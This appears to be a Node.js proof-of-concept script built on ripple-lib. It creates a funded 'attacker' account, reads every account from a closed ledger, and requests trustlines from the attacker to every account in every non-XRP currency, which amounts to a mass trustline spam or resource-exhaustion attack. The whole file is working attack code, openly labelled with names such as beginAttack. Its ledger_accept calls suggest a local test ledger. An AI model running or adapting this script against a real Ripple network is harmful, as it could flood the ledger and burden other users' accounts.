/* Loading ripple-lib with Node.js */
var Remote = require('ripple-lib').Remote;
var Amount = require('ripple-lib').Amount;
var Wallet = require('ripple-lib').Wallet;
var functions = require('./functions');

var trustmin = 1;
var trustmax = 1000;

var remote = functions.remote;
var getAccountInfo = functions.getAccountInfo;
var createNewAccount = functions.createNewAccount;
var makeTrustLine = functions.makeTrustLine;
var getClosedLedger = functions.getClosedLedger;
var tradeCurrencies = functions.tradeCurrencies;

var attacker;
var allAccounts;

function beginAttack() {
  var ledgerRequest = getClosedLedger( { expand: true } );
  ledgerRequest.on('success', function onSuccess(res){
    allAccounts = res.ledger.accountState;
    console.log('Found ' + allAccounts.length 
      + ' accounts to extend trustlines');
    console.log('Canonical currencies known: ' + (tradeCurrencies.length - 1));
    console.log('Total trustlines expected: ' 
      + ( allAccounts.length * ( tradeCurrencies.length - 1 ) ) );

    nextTrustLine(0, 0);
  });

}

function nextTrustLine(curr, acct)
{
  // Asyncronous nested for loops - curr, then acct
  while(acct < allAccounts.length
      && (allAccounts[acct].LedgerEntryType != 'AccountRoot'
        || allAccounts[acct].Account == attacker.address)
      ) {
    console.log('Skipping ledger entry of type: '
        + allAccounts[acct].LedgerEntryType);
    acct++;
  }
  if(acct >= allAccounts.length) {
    acct = 0;
    curr++;
  }
  if(tradeCurrencies[curr] == 'XRP') {
    curr++;
  }
  // console.log('curr: ' + curr + ' acct: ' + acct);
  if(curr >= tradeCurrencies.length) {
    getAccountInfo(attacker.address);
  } else {
    var limitHuman = "1" + tradeCurrencies[curr];
    var issuer = allAccounts[acct].Account;
    // console.log(allAccounts[acct]);
    // console.log(issuer);
    var limit = Amount.from_human(limitHuman);
    limit.parse_issuer(issuer);
    console.log('Requesting trustline to ' + limit.to_human_full());
    var trustReq = makeTrustLine(attacker.address, limit);
    trustReq.on('success', function onSuccess(res) {
      nextTrustLine(curr, acct+1);
    });
    trustReq.on('error', function onError(err) {
      var account = getAccountInfo(attacker.address);
      account.on('success', function end(res){
        remote.disconnect();
      });
      account.on('error', function end(err){
        remote.disconnect();
      });
    });
  }
}

remote.once('connect', function() {
  /* remote connected */

  var newAccount = createNewAccount(100000000, 100000000);
  attacker = newAccount.wallet;
  newAccount.fundingTransaction.on('success', function onSuccess(res){
    beginAttack();
  });

  setInterval(function() {
    remote.ledger_accept();
  }, 2500);

//  setTimeout(function() {
//    remote.disconnect();
//  }, 30000);
});
remote.on('disconnect', function() {
  console.log('Disconnect');
  process.exit();
});
remote.connect();

